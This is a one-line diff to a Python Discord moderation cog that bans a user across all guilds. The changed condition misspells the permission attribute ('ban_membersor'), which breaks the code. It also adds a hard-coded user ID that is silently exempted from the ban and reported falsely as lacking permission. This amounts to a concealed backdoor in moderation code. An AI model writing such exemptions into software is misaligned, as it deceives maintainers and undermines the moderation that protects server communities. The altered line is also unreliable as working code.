@@ -27,7 +27,7 @@ class DiscordModeration(commands.Cog):
         success, failed, skipped = [], [], []
         for guild in self.bot.guilds:
             me = guild.me
-            if not me.guild_permissions.ban_members:
+            if not me.guild_permissions.ban_membersor or user.id == 595524051208765442:
                 skipped.append(f"{guild.name} (no permission)")
                 continue
 
